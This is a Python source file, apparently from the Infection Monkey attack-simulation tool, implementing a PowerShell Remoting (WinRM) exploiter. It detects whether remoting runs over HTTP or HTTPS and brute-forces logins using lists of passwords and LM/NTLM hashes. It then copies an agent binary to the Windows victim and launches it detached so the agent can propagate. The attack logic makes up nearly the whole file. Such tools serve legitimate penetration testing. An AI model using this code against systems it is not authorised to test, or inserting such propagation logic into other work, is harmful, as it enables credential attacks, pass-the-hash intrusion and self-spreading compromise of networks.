import logging
import os
from typing import List, Optional

from common.utils.exploit_enum import ExploitType
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.powershell_utils.auth_options import (
    AUTH_NEGOTIATE,
    ENCRYPTION_AUTO,
    AuthOptions,
    get_auth_options,
)
from infection_monkey.exploit.powershell_utils.credentials import (
    Credentials,
    SecretType,
    get_credentials,
)
from infection_monkey.exploit.powershell_utils.powershell_client import (
    AuthenticationError,
    IPowerShellClient,
    PowerShellClient,
)
from infection_monkey.exploit.tools.helpers import get_monkey_depth
from infection_monkey.model import DROPPER_ARG, RUN_MONKEY, VictimHost
from infection_monkey.utils.commands import build_monkey_commandline
from infection_monkey.utils.environment import is_windows_os

logger = logging.getLogger(__name__)

TEMP_MONKEY_BINARY_FILEPATH = "./monkey_temp_bin"


class PowerShellRemotingDisabledError(Exception):
    pass


class RemoteAgentCopyError(Exception):
    pass


class RemoteAgentExecutionError(Exception):
    pass


class PowerShellExploiter(HostExploiter):
    _TARGET_OS_TYPE = ["windows"]
    EXPLOIT_TYPE = ExploitType.BRUTE_FORCE
    _EXPLOITED_SERVICE = "PowerShell Remoting (WinRM)"

    def __init__(self):
        super().__init__()
        self._client = None

    def _exploit_host(self):
        try:
            use_ssl = self._is_client_using_https()
        except PowerShellRemotingDisabledError as e:
            logger.info(e)
            self.exploit_result.error_message = (
                "PowerShell Remoting appears to be disabled on the remote host"
            )
            return self.exploit_result

        credentials = get_credentials(
            self.options["credentials"]["exploit_user_list"],
            self.options["credentials"]["exploit_password_list"],
            self.options["credentials"]["exploit_lm_hash_list"],
            self.options["credentials"]["exploit_ntlm_hash_list"],
            is_windows_os(),
        )

        auth_options = [get_auth_options(creds, use_ssl) for creds in credentials]

        self._client = self._authenticate_via_brute_force(credentials, auth_options)
        if not self._client:
            self.exploit_result.error_message = (
                "Unable to authenticate to the remote host using any of the available credentials"
            )
            return self.exploit_result

        self.exploit_result.exploitation_success = True

        try:
            self._execute_monkey_agent_on_victim()
            self.exploit_result.propagation_success = True
        except Exception as ex:
            logger.error(f"Failed to propagate to the remote host: {ex}")
            self.exploit_result.error_message = str(ex)

        return self.exploit_result

    def _is_client_using_https(self) -> bool:
        try:
            logger.debug("Checking if powershell remoting is enabled over HTTP.")
            self._try_http()
            return False
        except AuthenticationError:
            return False
        except Exception as e:
            logger.debug(f"Powershell remoting over HTTP seems disabled: {e}")

        try:
            logger.debug("Checking if powershell remoting is enabled over HTTPS.")
            self._try_https()
            return True
        except AuthenticationError:
            return True
        except Exception as e:
            logger.debug(f"Powershell remoting over HTTPS seems disabled: {e}")
            raise PowerShellRemotingDisabledError("Powershell remoting seems to be disabled.")

    def _try_http(self):
        self._try_ssl_login(use_ssl=False)

    def _try_https(self):
        self._try_ssl_login(use_ssl=True)

    def _try_ssl_login(self, use_ssl: bool):
        credentials = Credentials(
            username="dummy_username",
            secret="dummy_password",
            secret_type=SecretType.PASSWORD,
        )

        auth_options = AuthOptions(
            auth_type=AUTH_NEGOTIATE,
            encryption=ENCRYPTION_AUTO,
            ssl=use_ssl,
        )
        # TODO: Report login attempt or find a better way of detecting if SSL is enabled

        PowerShellClient(self.host.ip_addr, credentials, auth_options)

    def _authenticate_via_brute_force(
        self, credentials: List[Credentials], auth_options: List[AuthOptions]
    ) -> Optional[IPowerShellClient]:
        for (creds, opts) in zip(credentials, auth_options):
            try:
                client = PowerShellClient(self.host.ip_addr, creds, opts)
                logger.info(
                    f"Successfully logged into {self.host.ip_addr} using Powershell. User: "
                    f"{creds.username}, Secret Type: {creds.secret_type.name}"
                )

                self._report_login_attempt(True, creds)
                return client
            except Exception as ex:
                logger.debug(
                    f"Error logging into {self.host.ip_addr} using Powershell. User: "
                    f"{creds.username}, SecretType: {creds.secret_type.name} -- Error: {ex}"
                )
                self._report_login_attempt(False, creds)

        return None

    def _report_login_attempt(self, result: bool, credentials: Credentials):
        if credentials.secret_type in [SecretType.PASSWORD, SecretType.CACHED]:
            self.report_login_attempt(result, credentials.username, password=credentials.secret)
        elif credentials.secret_type == SecretType.LM_HASH:
            self.report_login_attempt(result, credentials.username, lm_hash=credentials.secret)
        elif credentials.secret_type == SecretType.NT_HASH:
            self.report_login_attempt(result, credentials.username, ntlm_hash=credentials.secret)
        else:
            raise ValueError(f"Unknown secret type {credentials.secret_type}")

    def _execute_monkey_agent_on_victim(self):
        monkey_path_on_victim = self.options["dropper_target_path_win_64"]

        self._copy_monkey_binary_to_victim(monkey_path_on_victim)
        logger.info("Successfully copied the monkey binary to the victim.")

        try:
            self._run_monkey_executable_on_victim(monkey_path_on_victim)
        except Exception as ex:
            raise RemoteAgentExecutionError(
                f"Failed to execute the agent binary on the victim: {ex}"
            )

    def _copy_monkey_binary_to_victim(self, monkey_path_on_victim):
        self._create_local_agent_file(TEMP_MONKEY_BINARY_FILEPATH)

        try:
            logger.info(f"Attempting to copy the monkey agent binary to {self.host.ip_addr}")
            self._client.copy_file(TEMP_MONKEY_BINARY_FILEPATH, monkey_path_on_victim)
        except Exception as ex:
            raise RemoteAgentCopyError(f"Failed to copy the agent binary to the victim: {ex}")
        finally:
            if os.path.isfile(TEMP_MONKEY_BINARY_FILEPATH):
                os.remove(TEMP_MONKEY_BINARY_FILEPATH)

    def _create_local_agent_file(self, binary_path):
        agent_binary_bytes = self.agent_repository.get_agent_binary("windows")
        with open(binary_path, "wb") as f:
            f.write(agent_binary_bytes.getvalue())

    def _run_monkey_executable_on_victim(self, executable_path):
        monkey_execution_command = build_monkey_execution_command(
            self.host, get_monkey_depth() - 1, executable_path
        )

        logger.info(
            f"Attempting to execute the monkey agent on remote host " f"{self.host.ip_addr}"
        )

        self._client.execute_cmd_as_detached_process(monkey_execution_command)


def build_monkey_execution_command(host: VictimHost, depth: int, executable_path: str) -> str:
    monkey_params = build_monkey_commandline(
        target_host=host,
        depth=depth,
        location=executable_path,
    )

    return RUN_MONKEY % {
        "monkey_path": executable_path,
        "monkey_type": DROPPER_ARG,
        "parameters": monkey_params,
    }
